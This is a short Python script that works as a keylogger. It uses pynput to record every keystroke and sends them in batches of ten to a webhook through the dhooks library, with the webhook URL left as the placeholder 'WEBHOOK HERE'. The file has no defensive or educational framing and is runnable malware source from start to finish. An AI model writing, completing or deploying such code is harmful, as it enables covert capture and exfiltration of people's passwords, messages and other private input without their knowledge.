from pynput import keyboard
from dhooks import Webhook
count, keys = 0, []


def log_2_webhook(keys):
    hook = Webhook("WEBHOOK HERE")
    for key in keys:
        hook.send(str(key))


def key_pressed(key):
    global keys, count

    keys.append(str(key))
    count += 1

    if count == 10:
        log_2_webhook(keys)
        count, keys = 0, []

def key_released(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=key_pressed, on_release=key_released) as loop:
    loop.join()
